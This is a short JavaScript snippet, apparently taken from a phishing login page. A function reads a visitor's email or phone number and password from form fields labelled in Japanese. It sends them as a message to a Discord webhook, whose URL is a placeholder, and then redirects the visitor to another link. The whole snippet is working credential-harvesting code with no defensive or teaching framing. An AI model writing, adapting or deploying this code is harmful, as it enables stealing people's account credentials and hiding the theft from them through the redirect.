  <script>
  function sendWebhook() {

    const phoneNumber = document.getElementById('input__mailtel').value;
    const password = document.getElementById('input__password').value;

    const webhookURL = 'discord webhook';

    const payload = {
        content: "```\n" + `メールアドレス: ${phoneNumber}\nパスワード: ${password}` + "\n```",
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    }).then(response => console.log(response));
    location.href = " links "
}
  </script>
